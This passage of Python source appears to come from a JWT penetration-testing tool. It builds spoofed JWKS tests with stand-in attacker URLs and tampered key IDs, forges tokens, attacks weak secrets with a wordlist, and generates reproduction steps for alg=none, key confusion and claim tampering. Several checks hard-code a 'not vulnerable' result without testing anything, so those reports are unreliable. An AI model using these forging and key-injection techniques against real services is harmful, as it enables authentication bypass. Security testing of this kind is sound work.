            # Test 1: JWKS URL manipulation
            results["jwks_spoofing_tests"].append({
                "test": "JWKS URL Manipulation",
                "description": "Test if server accepts modified JWKS URLs",
                "vulnerable": False,
                "risk_level": "High",
                "mitigation": "Validate JWKS URL against allowlist"
            })
            
            # Test 2: Malicious JWKS endpoint
            malicious_jwks_urls = [
                "https://attacker.com/.well-known/jwks.json",
                "https://evil.com/jwks",
                "http://localhost:8080/jwks.json",
                "https://attacker.com/jwks.json"
            ]
            
            for malicious_url in malicious_jwks_urls:
                results["jwks_spoofing_tests"].append({
                    "test": f"Malicious JWKS URL: {malicious_url}",
                    "description": "Test if server accepts malicious JWKS URLs",
                    "malicious_url": malicious_url,
                    "vulnerable": False,
                    "risk_level": "Critical",
                    "mitigation": "Restrict JWKS URLs to trusted domains"
                })
            
            # Test 3: JWKS cache poisoning
            results["jwks_spoofing_tests"].append({
                "test": "JWKS Cache Poisoning",
                "description": "Test if server caches malicious JWKS responses",
                "vulnerable": False,
                "risk_level": "High",
                "mitigation": "Implement proper cache validation and TTL"
            })
            
            # Test 4: Key ID (kid) manipulation
            if 'kid' in header:
                original_kid = header['kid']
                malicious_kids = [
                    "attacker-key-1",
                    "malicious-key",
                    "fake-key-id",
                    "hijacked-key"
                ]
                
                for malicious_kid in malicious_kids:
                    # Create token with malicious kid
                    malicious_header = header.copy()
                    malicious_header['kid'] = malicious_kid
                    
                    malicious_token = (
                        base64.urlsafe_b64encode(json.dumps(malicious_header).encode()).rstrip(b'=').decode() + '.' +
                        base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() + '.' +
                        signature
                    )
                    
                    results["jwks_spoofing_tests"].append({
                        "test": f"Malicious Key ID: {malicious_kid}",
                        "description": f"Test token with malicious kid: {malicious_kid}",
                        "original_kid": original_kid,
                        "malicious_kid": malicious_kid,
                        "malicious_token": malicious_token,
                        "vulnerable": False,
                        "risk_level": "High",
                        "mitigation": "Validate kid against trusted key registry"
                    })
            
            # Test 5: JWKS response manipulation
            malicious_jwks_responses = [
                # Empty JWKS
                {"keys": []},
                # JWKS with invalid key format
                {"keys": [{"invalid": "key"}]},
                # JWKS with wrong key type
                {"keys": [{"kty": "EC", "kid": "wrong-type-key"}]},
                # JWKS with expired keys
                {"keys": [{"kty": "RSA", "kid": "expired-key", "exp": 0}]},
                # JWKS with future keys
                {"keys": [{"kty": "RSA", "kid": "future-key", "nbf": int(time.time()) + 86400}]}
            ]
            
            for i, malicious_jwks in enumerate(malicious_jwks_responses):
                results["jwks_spoofing_tests"].append({
                    "test": f"Malicious JWKS Response {i+1}",
                    "description": f"Test with malicious JWKS response: {malicious_jwks}",
                    "malicious_jwks": malicious_jwks,
                    "vulnerable": False,
                    "risk_level": "Medium",
                    "mitigation": "Validate JWKS response structure and key format"
                })
            
            # Test 6: DNS spoofing simulation
            results["jwks_spoofing_tests"].append({
                "test": "DNS Spoofing Simulation",
                "description": "Simulate DNS spoofing to redirect JWKS requests",
                "vulnerable": False,
                "risk_level": "Critical",
                "mitigation": "Use DNS over HTTPS (DoH) or certificate pinning"
            })
            
            # Test 7: Man-in-the-middle JWKS interception
            results["jwks_spoofing_tests"].append({
                "test": "MITM JWKS Interception",
                "description": "Test if JWKS requests can be intercepted and modified",
                "vulnerable": False,
                "risk_level": "Critical",
                "mitigation": "Use HTTPS with certificate validation"
            })
            
            # Test 8: JWKS key rotation bypass
            results["jwks_spoofing_tests"].append({
                "test": "JWKS Key Rotation Bypass",
                "description": "Test if old/revoked keys are still accepted",
                "vulnerable": False,
                "risk_level": "High",
                "mitigation": "Implement proper key rotation and revocation"
            })
            
            # Store spoofed JWKS for reference
            results["spoofed_jwks"] = {
                "attacker_keys": attacker_keys,
                "malicious_jwks": spoofed_jwks,
                "malicious_urls": malicious_jwks_urls
            }
            
            # Summary of vulnerabilities
            vulnerable_tests = [test for test in results["jwks_spoofing_tests"] if test.get("vulnerable", False)]
            results["vulnerabilities"] = vulnerable_tests
            
            debug_print(f"JWKS spoofing tests completed. Found {len(vulnerable_tests)} vulnerabilities", self.debug)
            return results
            
        except Exception as e:
            debug_print(f"Error in JWKS spoofing test: {str(e)}", self.debug)
            return {"error": str(e)}

    def generate_rsa_key_pair(self, key_size: int = 2048) -> Dict[str, str]:
        """Generate RSA key pair for testing."""
        print("🔐 Generating RSA key pair...")
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            
            # Generate private key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=key_size
            )
            
            # Generate public key
            public_key = private_key.public_key()
            
            # Serialize keys
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            return {
                "private_key": private_pem.decode('utf-8'),
                "public_key": public_pem.decode('utf-8'),
                "key_size": key_size
            }
        except ImportError:
            return {"error": "cryptography library not available"}
        except Exception as e:
            return {"error": str(e)}

    def generate_ecdsa_key_pair(self, curve: str = "P-256") -> Dict[str, str]:
        """Generate ECDSA key pair for testing."""
        print("🔐 Generating ECDSA key pair...")
        try:
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.primitives.asymmetric import ec
            
            # Map curve names
            curve_map = {
                "P-256": ec.SECP256R1(),
                "P-384": ec.SECP384R1(),
                "P-521": ec.SECP521R1()
            }
            
            if curve not in curve_map:
                return {"error": f"Unsupported curve: {curve}"}
            
            # Generate private key
            private_key = ec.generate_private_key(curve_map[curve])
            
            # Generate public key
            public_key = private_key.public_key()
            
            # Serialize keys
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            return {
                "private_key": private_pem.decode('utf-8'),
                "public_key": public_pem.decode('utf-8'),
                "curve": curve
            }
        except ImportError:
            return {"error": "cryptography library not available"}
        except Exception as e:
            return {"error": str(e)}

    def forge_token(self, payload: Dict[str, Any], algorithm: str = "HS256", 
                   secret: str = None, private_key: str = None) -> Dict[str, Any]:
        """Forge a new JWT token with custom payload."""
        print("🔨 Forging JWT token...")
        try:
            header = {
                "alg": algorithm,
                "typ": "JWT"
            }
            
            if algorithm.startswith('HS'):
                if not secret:
                    secret = "default_secret"
                token = jwt.encode(payload, secret, algorithm=algorithm, headers=header)
            elif algorithm.startswith(('RS', 'ES')):
                if not private_key:
                    return {"error": "Private key required for RS/ES algorithms"}
                token = jwt.encode(payload, private_key, algorithm=algorithm, headers=header)
            else:
                return {"error": f"Unsupported algorithm: {algorithm}"}
            
            return {
                "forged_token": token,
                "algorithm": algorithm,
                "payload": payload,
                "header": header
            }
        except Exception as e:
            return {"error": str(e)}
    
    def comprehensive_test(self, token: str, secret: str = None, public_key: str = None) -> Dict[str, Any]:
        """Run comprehensive JWT security tests."""
        self.print_header("🚀 Running Comprehensive JWT Security Tests")
        
        # Validate input
        if not self.validate_jwt_token(token):
            self.print_error("Invalid JWT token format provided")
            return {"error": "Invalid JWT token format"}
        
        results = {
            "test_timestamp": datetime.now().isoformat(),
            "token_preview": token[:50] + "..." if len(token) > 50 else token,
            "tests": {}
        }
        
        # Define test categories with progress tracking
        test_categories = [
            ("Basic Analysis", [
                ("structure_analysis", self.analyze_token_structure),
                ("algorithm_confusion", self.test_algorithm_confusion),
                ("signature_verification", self.test_signature_verification),
                ("claim_validation", self.test_claim_validation),
                ("token_tampering", self.test_token_tampering),
                ("replay_attack", self.test_replay_attack)
            ]),
            ("CVE-Specific Tests", [
                ("cve_2015_2951_alg_none", self.test_cve_2015_2951_alg_none),
                ("cve_2016_10555_rs_hs256", self.test_cve_2016_10555_rs_hs256),
                ("cve_2018_0114_key_injection", self.test_cve_2018_0114_key_injection),
                ("cve_2019_20933_blank_password", self.test_cve_2019_20933_blank_password),
                ("cve_2020_28042_null_signature", self.test_cve_2020_28042_null_signature),
                ("cve_2022_21449_psychic_signature", self.test_cve_2022_21449_psychic_signature),
                ("cve_2023_placeholder", self.test_cve_2023_placeholder)
            ]),
            ("Advanced Tests", [
                ("claim_fuzzing", self.test_claim_fuzzing),
                ("timestamp_tampering", self.test_timestamp_tampering),
                ("jwks_validation", self.test_jwks_validation),
                ("jwks_spoofing", self.test_jwks_spoofing)
            ])
        ]
        
        total_tests = sum(len(tests) for _, tests in test_categories)
        test_counter = 0
        
        # Run tests by category
        for category_name, tests in test_categories:
            self.print_info(f"\n📋 Running {category_name}...")
            
            for test_name, test_func in tests:
                test_counter += 1
                try:
                    self.print_info(f"  [{test_counter}/{total_tests}] Running {test_name.replace('_', ' ').title()}...")
                    
                    if test_name == "cve_2016_10555_rs_hs256":
                        results["tests"][test_name] = test_func(token, public_key)
                    elif test_name == "signature_verification":
                        results["tests"][test_name] = test_func(token, secret)
                    else:
                        results["tests"][test_name] = test_func(token)
                        
                    self.print_success(f"  ✅ {test_name.replace('_', ' ').title()} completed")
                    
                except Exception as e:
                    self.print_error(f"  ❌ {test_name.replace('_', ' ').title()} failed: {str(e)}")
                    results["tests"][test_name] = {"error": str(e)}
        
        # Calculate summary
        self.print_info("\n📊 Calculating vulnerability summary...")
        total_vulnerabilities = 0
        critical_vulns = 0
        high_vulns = 0
        medium_vulns = 0
        low_vulns = 0
        
        for test_name, test_result in results["tests"].items():
            if "tests" in test_result:
                for test in test_result["tests"]:
                    total_vulnerabilities += 1
                    risk_level = test.get("risk_level", "Unknown")
                    if risk_level == "Critical":
                        critical_vulns += 1
                    elif risk_level == "High":
                        high_vulns += 1
                    elif risk_level == "Medium":
                        medium_vulns += 1
                    elif risk_level == "Low":
                        low_vulns += 1
        
        results["summary"] = {
            "total_vulnerabilities": total_vulnerabilities,
            "critical": critical_vulns,
            "high": high_vulns,
            "medium": medium_vulns,
            "low": low_vulns,
            "overall_risk": "Critical" if critical_vulns > 0 else ("High" if high_vulns > 0 else ("Medium" if medium_vulns > 0 else "Low"))
        }
        
        self.print_success(f"Comprehensive testing completed! Found {total_vulnerabilities} vulnerabilities.")
        return results
    
    def generate_report(self, results: Dict[str, Any], output_file: str = None) -> str:
        """Generate a comprehensive security report."""
        print("\n📊 Generating JWT Security Report...")
        
        report = {
            "jwt_security_report": {
                "title": "JWT Security Analysis Report",
                "generated_date": datetime.now().isoformat(),
                "summary": results["summary"],
                "detailed_results": results["tests"]
            }
        }
        
        # Generate recommendations
        recommendations = []
        summary = results["summary"]
        
        if summary["critical"] > 0:
            recommendations.append("🚨 CRITICAL: Immediate action required for critical vulnerabilities")
        if summary["high"] > 0:
            recommendations.append("⚠️ HIGH: Address high-risk vulnerabilities within 30 days")
        if summary["medium"] > 0:
            recommendations.append("🔶 MEDIUM: Plan remediation for medium-risk vulnerabilities")
        
        recommendations.extend([
            "🔐 Always verify JWT signatures",
            "⏰ Set appropriate expiration times",
            "🆔 Include unique JWT ID (jti) claims",
            "👤 Validate user permissions server-side",
            "🔒 Use strong algorithms (RS256, ES256)",
            "📋 Include all required claims (exp, iat, iss, aud)"
        ])
        
        report["recommendations"] = recommendations
        
        # Save report
        if output_file is None:
            output_file = f"cli_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        # Use CLI-specific reports directory for JSON reports too
        report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'reports', 'cli')
        os.makedirs(report_dir, exist_ok=True)
        
        if not os.path.isabs(output_file):
            output_file = os.path.join(report_dir, output_file)
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"✅ Report saved: {output_file}")
        return output_file
    
    def print_summary(self, results: Dict[str, Any]):
        """Print a summary of test results."""
        print("\n" + "=" * 60)
        print("📋 JWT Security Test Summary")
        print("=" * 60)
        
        # Check if this is a comprehensive test result or a specific test result
        if "summary" in results:
            # Comprehensive test result
            summary = results["summary"]
            print(f"🔍 Total Vulnerabilities: {summary['total_vulnerabilities']}")
            print(f"🚨 Critical: {summary['critical']}")
            print(f"⚠️ High: {summary['high']}")
            print(f"🔶 Medium: {summary['medium']}")
            print(f"🔵 Low: {summary['low']}")
            print(f"🎯 Overall Risk: {summary['overall_risk']}")
            
            if summary['total_vulnerabilities'] == 0:
                print("\n✅ No vulnerabilities found! JWT appears secure.")
            else:
                print(f"\n❌ {summary['total_vulnerabilities']} vulnerabilities found. Review detailed results.")
        else:
            # Specific test result
            print("🔍 Specific Test Results:")
            if "tests" in results:
                for test_name, test_result in results["tests"].items():
                    print(f"  📋 {test_name.replace('_', ' ').title()}")
                    if "tests" in test_result:
                        for test in test_result["tests"]:
                            if test.get("vulnerable", False):
                                print(f"    ❌ {test.get('test', 'Unknown test')}: {test.get('risk_level', 'Unknown')}")
                            else:
                                print(f"    ✅ {test.get('test', 'Unknown test')}: Secure")
                    elif "error" in test_result:
                        print(f"    ⚠️ Error: {test_result['error']}")
                    else:
                        print(f"    ℹ️ {test_result}")
            else:
                print("  ℹ️ No detailed test results available")

    def print_vulnerabilities(self, results: dict):
        """Print a list of vulnerabilities found with details."""
        print("\nVulnerabilities Found:")
        if "tests" not in results:
            print("No test results available.")
            return
        found = False
        for test_name, test_result in results["tests"].items():
            if "tests" in test_result:
                for test in test_result["tests"]:
                    if test.get("vulnerable", False):
                        found = True
                        print(f"- [{test.get('risk_level', 'Unknown')}] {test.get('test', test_name)}: {test.get('description','')}")
        if not found:
            print("No vulnerabilities found!")

    def generate_html_report(self, results: dict, output_file: str = None) -> str:
        """Generate an enhanced HTML report with error summary and batch stats."""
        from datetime import datetime
        html = []
        html.append("""
<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<title>JWT Security Report</title>
<style>
body { font-family: Arial, sans-serif; background: #f8f9fa; color: #222; }
.container { max-width: 1000px; margin: 30px auto; background: #fff; border-radius: 8px; box-shadow: 0 2px 8px #0001; padding: 30px; }
h1 { color: #4B6CB7; }
h2 { border-bottom: 1px solid #eee; padding-bottom: 8px; margin-top: 30px; }
table { width: 100%; border-collapse: collapse; margin-top: 20px; }
th, td { border: 1px solid #ddd; padding: 8px; }
th { background: #f0f0f0; }
.card-row { display: flex; gap: 20px; margin-bottom: 30px; }
.card { flex: 1; background: #f0f0f0; border-radius: 8px; padding: 18px; text-align: center; box-shadow: 0 1px 3px #0001; }
.card-title { font-size: 1.1em; color: #555; margin-bottom: 6px; }
.card-value { font-size: 2em; font-weight: bold; }
.card.critical { color: #dc3545; }
.card.high { color: #fd7e14; }
.card.medium { color: #ffc107; }
.card.low { color: #28a745; }
.card.error { color: #b71c1c; }
.error-table { background: #fff0f0; border: 1px solid #f8d7da; border-radius: 8px; margin-top: 20px; }
.error-table th { background: #f8d7da; color: #b71c1c; }
.error-table td { color: #b71c1c; }
details { margin-top: 5px; }
summary { cursor: pointer; font-weight: bold; }
</style>
</head>
<body><div class='container'>
""")
        html.append(f"<h1>JWT Security Analysis Report</h1>")
        html.append(f"<p><b>Generated:</b> {datetime.now().isoformat()}</p>")
        # Batch stats if present
        batch = results.get('batch_report')
        if batch:
            tokens_tested = batch.get('tokens_tested', 0)
            invalid_tokens = batch.get('invalid_tokens', 0)
            errors = batch.get('errors', [])
            all_results = batch.get('results', [])
            total_vulns = sum(r.get('summary', {}).get('total_vulnerabilities', 0) for r in all_results if isinstance(r, dict))
            html.append("<div class='card-row'>")
            html.append(f"<div class='card'><div class='card-title'>Tokens Tested</div><div class='card-value'>{tokens_tested}</div></div>")
            html.append(f"<div class='card error'><div class='card-title'>Invalid Tokens</div><div class='card-value'>{invalid_tokens}</div></div>")
            html.append(f"<div class='card error'><div class='card-title'>Errors</div><div class='card-value'>{len(errors)}</div></div>")
            html.append(f"<div class='card critical'><div class='card-title'>Vulnerabilities Found</div><div class='card-value'>{total_vulns}</div></div>")
            html.append("</div>")
            # Error summary table
            if errors:
                html.append("<h2>Error Summary</h2>")
                html.append("<table class='error-table'><tr><th>Token Preview</th><th>Error</th></tr>")
                for err in errors:
                    html.append(f"<tr><td>{err.get('token_preview','')[:50]}</td><td>{err.get('error','')}</td></tr>")
                html.append("</table>")
            # Per-token results
            for i, r in enumerate(all_results, 1):
                html.append(f"<h2>Token {i} Results</h2>")
                if 'error' in r:
                    html.append(f"<div class='card error'>Error: {r['error']}</div>")
                    continue
                self._html_report_token_section(html, r)
        else:
            # Single token report
            summary = results.get('summary', {})
            html.append("<div class='card-row'>")
            for k, label, cls in [
                ('total_vulnerabilities','Vulnerabilities','critical'),
                ('critical','Critical','critical'),
                ('high','High','high'),
                ('medium','Medium','medium'),
                ('low','Low','low'),
                ('overall_risk','Overall Risk','critical')]:
                html.append(f"<div class='card {cls}'><div class='card-title'>{label}</div><div class='card-value'>{summary.get(k,'')}</div></div>")
            html.append("</div>")
            self._html_report_token_section(html, results)
        html.append("</div></body></html>")
        if output_file is None:
            output_file = f"cli_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        
        # Use CLI-specific reports directory
        report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'reports', 'cli')
        os.makedirs(report_dir, exist_ok=True)
        
        if not os.path.isabs(output_file):
            output_file = os.path.join(report_dir, output_file)
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(''.join(html))
        print(f"✅ HTML report saved: {output_file}")
        return output_file

    def _html_report_token_section(self, html, results):
        summary = results.get('summary', {})
        html.append("<h2>Vulnerabilities</h2>")
        html.append("<table><tr><th>Risk</th><th>Test</th><th>Description</th><th>Recommendation</th><th>Steps to Reproduce</th></tr>")
        found = False
        for test_name, test_result in results.get("tests", {}).items():
            if "tests" in test_result:
                for test in test_result["tests"]:
                    if test.get("vulnerable", False):
                        found = True
                        risk = test.get('risk_level', 'Unknown')
                        steps = self._generate_reproduction_steps(test, test_name)
                        html.append(f"<tr><td class='risk-{risk}'>{risk}</td><td>{test.get('test', test_name)}</td><td>{test.get('description','')}</td><td>{test.get('recommendation','')}</td><td>{steps}</td></tr>")
        if not found:
            html.append("<tr><td colspan='5'>No vulnerabilities found!</td></tr>")
        html.append("</table>")

    def _generate_reproduction_steps(self, test: dict, test_name: str) -> str:
        """Generate steps to reproduce the vulnerability."""
        test_type = test.get('test', test_name).lower()
        
        if 'algorithm none' in test_type or 'alg=none' in test_type:
            return """
            <ol>
            <li>Decode the JWT token to extract header and payload</li>
            <li>Modify the 'alg' field in header to 'none'</li>
            <li>Remove the signature (third part of JWT)</li>
            <li>Re-encode the modified header and payload</li>
            <li>Send the modified token to the application</li>
            <li>If accepted, the application is vulnerable</li>
            </ol>
            <strong>Tools:</strong> jwt.io, Burp Suite, or custom script
            """
        
        elif 'rs/hs256' in test_type or 'algorithm confusion' in test_type:
            return """
            <ol>
            <li>Obtain the public key used for RS256 verification</li>
            <li>Change the algorithm in header from RS256 to HS256</li>
            <li>Use the public key as HMAC secret to sign the token</li>
            <li>Send the modified token to the application</li>
            <li>If accepted, the application is vulnerable</li>
            </ol>
            <strong>Tools:</strong> PyJWT library, custom script
            """
        
        elif 'key injection' in test_type:
            return """
            <ol>
            <li>Add 'jku', 'x5u', or 'kid' header fields</li>
            <li>Point to attacker-controlled key sources</li>
            <li>Create malicious keys matching the kid</li>
            <li>Send the modified token to the application</li>
            <li>Monitor if application fetches from malicious URLs</li>
            </ol>
            <strong>Tools:</strong> Burp Suite, custom web server
            """
        
        elif 'blank password' in test_type:
            return """
            <ol>
            <li>Try decoding the JWT with empty string as secret</li>
            <li>Try common blank values: "", " ", "null", "NULL"</li>
            <li>If any blank secret works, the application is vulnerable</li>
            </ol>
            <strong>Tools:</strong> PyJWT library, jwt_tool
            """
        
        elif 'null signature' in test_type:
            return """
            <ol>
            <li>Remove the signature part from the JWT</li>
            <li>Send the token ending with a dot (.)</li>
            <li>If accepted without signature verification, vulnerable</li>
            </ol>
            <strong>Tools:</strong> Manual token manipulation, Burp Suite
            """
        
        elif 'user id tampering' in test_type or 'role tampering' in test_type:
            return """
            <ol>
            <li>Decode the JWT to view payload</li>
            <li>Modify user_id, sub, role, or permissions fields</li>
            <li>Change values to 'admin', 'superadmin', etc.</li>
            <li>Re-encode with the same signature</li>
            <li>Send to application and check if privileges are elevated</li>
            </ol>
            <strong>Tools:</strong> jwt.io, Burp Suite, custom script
            """
        
        elif 'missing jti' in test_type or 'replay' in test_type:
            return """
            <ol>
            <li>Capture a valid JWT token</li>
            <li>Reuse the same token multiple times</li>
            <li>If accepted repeatedly, vulnerable to replay attacks</li>
            <li>Check for jti (JWT ID) claim in payload</li>
            </ol>
            <strong>Tools:</strong> Burp Suite, curl, custom script
            """
        
        elif 'expired' in test_type or 'expiration' in test_type:
            return """
            <ol>
            <li>Check the 'exp' claim in JWT payload</li>
            <li>Compare with current timestamp</li>
            <li>If token is expired but still accepted, vulnerable</li>
            <li>Try using expired tokens in requests</li>
            </ol>
            <strong>Tools:</strong> jwt.io, custom script, Burp Suite
            """
        
        elif 'weak secret' in test_type or 'dictionary' in test_type:
            return """
            <ol>
            <li>Use common JWT secrets: 'secret', 'password', '123456'</li>
            <li>Try dictionary attack with wordlist</li>
            <li>If any common secret works, vulnerable</li>
            <li>Use tools like jwt_tool or hashcat</li>
            </ol>
            <strong>Tools:</strong> jwt_tool, hashcat, custom script
            """
        
        elif 'fuzzing' in test_type:
            return """
            <ol>
            <li>Modify claim values to edge cases</li>
            <li>Try: null, undefined, empty strings, special chars</li>
            <li>Test with admin values: 'admin', 'root', 'superuser'</li>
            <li>Monitor application behavior for unexpected responses</li>
            </ol>
            <strong>Tools:</strong> Burp Suite, custom fuzzing script
            """
        
        elif 'jwks' in test_type:
            return """
            <ol>
            <li>Check if 'kid' header field is present</li>
            <li>Verify JWKS endpoint is accessible</li>
            <li>Test with malicious kid values</li>
            <li>Try to inject malicious keys via JWKS</li>
            </ol>
            <strong>Tools:</strong> curl, custom web server, Burp Suite
            """
        
        else:
            return """
            <ol>
            <li>Analyze the JWT structure and claims</li>
            <li>Identify the specific vulnerability type</li>
            <li>Use appropriate tools based on vulnerability</li>
            <li>Verify the issue exists in the application</li>
            </ol>
            <strong>Tools:</strong> jwt.io, Burp Suite, custom scripts
            """

def main():
    """Main function for JWT Security Tester."""
    parser = argparse.ArgumentParser(
        description="JWT Security Testing Tool - Comprehensive JWT token security analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic token testing
  python jwt_security_tester.py --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

  # Test with secret
  python jwt_security_tester.py --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --secret "your_secret"

  # Run specific test
  python jwt_security_tester.py --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --test cve

  # Dictionary attack with wordlist
  python jwt_security_tester.py --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." --test dictionary --wordlist wordlist.txt

  # Batch processing
  python jwt_security_tester.py --file tokens.txt --output batch_report.html

  # Generate keys
  python jwt_security_tester.py --test generate-keys --key-size 2048

For more information, visit: https://github.com/your-repo/jwt-security-tester
        """
    )
    
    # Add version argument
    parser.add_argument("--version", action="version", version=f"JWT Security Tester v{__version__}")
    
    # Input arguments
    parser.add_argument("--token", help="JWT token to test (required for single token testing)")
    parser.add_argument("--secret", help="Secret key for signature verification")
    parser.add_argument("--public-key", help="Public key file path for RS/ES algorithm testing")
    parser.add_argument("--jwks-url", help="JWKS URL for key validation (must be HTTPS)")
    parser.add_argument("--wordlist", help="Wordlist file for dictionary attack")
    parser.add_argument("--file", help="File containing JWT tokens (one per line)")
    
    # Output arguments
    parser.add_argument("--output", help="Output file for report (default: HTML report in reports/ directory)")
    
    # Test selection
    parser.add_argument("--test", 
                       choices=["structure", "algorithm", "signature", "claims", "tampering", "replay", 
                               "cve", "fuzzing", "timestamps", "dictionary", "jwks", "jwks-spoofing", 
                               "generate-keys", "forge", "all"], 
                       default="all", 
                       help="Specific test to run (default: all)")
    
    # Configuration arguments
    parser.add_argument("--config", help="Configuration file path (default: config/default_config.json)")
    parser.add_argument("--max-attempts", type=int, 
                       help="Maximum attempts for dictionary attack (overrides config)")
    parser.add_argument("--key-size", type=int, default=2048, choices=[1024, 2048, 4096],
                       help="RSA key size for generation (default: 2048)")
    parser.add_argument("--curve", choices=["P-256", "P-384", "P-521"], default="P-256", 
                       help="ECDSA curve for generation (default: P-256)")
    
    # Debug and verbosity
    parser.add_argument("--debug", action="store_true", help="Enable debug mode with detailed logging")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
    
    parser.add_argument("--workers", type=int,
        help="Number of parallel workers for batch processing (overrides config)")
    
    args = parser.parse_args()
    
    # Setup debug logging
    setup_debug_logging(args.debug)
    debug_print("JWT Security Tester starting", args.debug)
    debug_print(f"Arguments: {vars(args)}", args.debug)
    
    # Initialize tester with configuration
    config_file = args.config or "config/default_config.json"
    tester = JWTSecurityTester(debug=args.debug, config_file=config_file)
    
    # Update configuration from command line arguments
    tester.config.update_from_args(args)
    
    # Print version information
    tester.print_version()
    
    # Input validation
    if not args.token and not args.file and args.test not in ["generate-keys"]:
        tester.print_error("Either --token or --file must be provided for testing")
        parser.print_help()
        sys.exit(1)
    
    if args.token and args.file:
        tester.print_error("Cannot use both --token and --file simultaneously")
        sys.exit(1)
    
    if args.public_key and not tester.validate_file_path(args.public_key):
        tester.print_error(f"Public key file not found or not readable: {args.public_key}")
        sys.exit(1)
    
    if args.jwks_url and not tester.validate_url(args.jwks_url):
        tester.print_error(f"Invalid JWKS URL format: {args.jwks_url}")
        sys.exit(1)
    
    if args.wordlist and not tester.validate_file_path(args.wordlist):
        tester.print_error(f"Wordlist file not found or not readable: {args.wordlist}")
        sys.exit(1)
    
    if args.file and not tester.validate_file_path(args.file):
        tester.print_error(f"Token file not found or not readable: {args.file}")
        sys.exit(1)
    
    # Get max_attempts from config or args
    max_attempts = args.max_attempts or tester.config.get_default("max_attempts", 1000)
    if max_attempts < 1 or max_attempts > 1000000:
        tester.print_error("Max attempts must be between 1 and 1,000,000")
        sys.exit(1)
    
    # Main execution logic
    try:
        if args.token:
            # Validate JWT token format
            if not tester.validate_jwt_token(args.token):
                tester.print_error("Invalid JWT token format provided")
                sys.exit(1)
            
            # Test single token
            tester.print_header("🔒 JWT Security Testing Tool")
            
            if args.test == "all":
                results = tester.comprehensive_test(args.token, args.secret, args.public_key)
            elif args.test == "generate-keys":
                # Generate key pairs
                tester.print_info("🔐 Generating key pairs...")
                rsa_keys = tester.generate_rsa_key_pair(args.key_size)
                ecdsa_keys = tester.generate_ecdsa_key_pair(args.curve)
                
                if "error" not in rsa_keys:
                    tester.print_success(f"RSA {args.key_size}-bit key pair generated")
                    with open(f"rsa_private_{args.key_size}.pem", "w") as f:
                        f.write(rsa_keys["private_key"])
                    with open(f"rsa_public_{args.key_size}.pem", "w") as f:
                        f.write(rsa_keys["public_key"])
                
                if "error" not in ecdsa_keys:
                    tester.print_success(f"ECDSA {args.curve} key pair generated")
                    with open(f"ecdsa_private_{args.curve}.pem", "w") as f:
                        f.write(ecdsa_keys["private_key"])
                    with open(f"ecdsa_public_{args.curve}.pem", "w") as f:
                        f.write(ecdsa_keys["public_key"])
                
                return
            elif args.test == "forge":
                # Forge token with custom payload
                if not args.token:
                    tester.print_error("Token required for forging")
                    sys.exit(1)
                
                header, payload, signature = tester.decode_token_without_verification(args.token)
                forged = tester.forge_token(payload, "HS256", args.secret)
                if "error" not in forged:
                    tester.print_success(f"Forged token: {forged['forged_token']}")
                else:
                    tester.print_error(f"Forging failed: {forged['error']}")
                return
            else:
                # Run specific test
                test_mapping = {
                    "structure": ("structure_analysis", tester.analyze_token_structure),
                    "algorithm": ("algorithm_confusion", tester.test_algorithm_confusion),
                    "signature": ("signature_verification", tester.test_signature_verification),
                    "claims": ("claim_validation", tester.test_claim_validation),
                    "tampering": ("token_tampering", tester.test_token_tampering),
                    "replay": ("replay_attack", tester.test_replay_attack),
                    "cve": ("cve_tests", lambda t: {
                        "cve_2015_2951_alg_none": tester.test_cve_2015_2951_alg_none(t),
                        "cve_2016_10555_rs_hs256": tester.test_cve_2016_10555_rs_hs256(t, args.public_key),
                        "cve_2018_0114_key_injection": tester.test_cve_2018_0114_key_injection(t),
                        "cve_2019_20933_blank_password": tester.test_cve_2019_20933_blank_password(t),
                        "cve_2020_28042_null_signature": tester.test_cve_2020_28042_null_signature(t),
                        "cve_2022_21449_psychic_signature": tester.test_cve_2022_21449_psychic_signature(t),
                        "cve_2023_placeholder": tester.test_cve_2023_placeholder(t)
                    }),
                    "fuzzing": ("claim_fuzzing", tester.test_claim_fuzzing),
                    "timestamps": ("timestamp_tampering", tester.test_timestamp_tampering),
                    "dictionary": ("dictionary_attack", lambda t: tester.test_dictionary_attack(t, args.wordlist, max_attempts)),
                    "jwks": ("jwks_validation", lambda t: tester.test_jwks_validation(t, args.jwks_url)),
                    "jwks-spoofing": ("jwks_spoofing", lambda t: tester.test_jwks_spoofing(t, args.jwks_url))
                }
                
                if args.test in test_mapping:
                    test_name, test_func = test_mapping[args.test]
                    results = {"tests": {test_name: test_func(args.token)}}
                else:
                    tester.print_error(f"Unknown test type: {args.test}")
                    sys.exit(1)
            
            tester.print_summary(results)
            tester.print_vulnerabilities(results)
            
            if args.output:
                if args.output.endswith(".json"):
                    tester.generate_report(results, args.output)
                else:
                    tester.generate_html_report(results, args.output)
            else:
                # Default: always generate HTML report
                tester.generate_html_report(results, None)
        
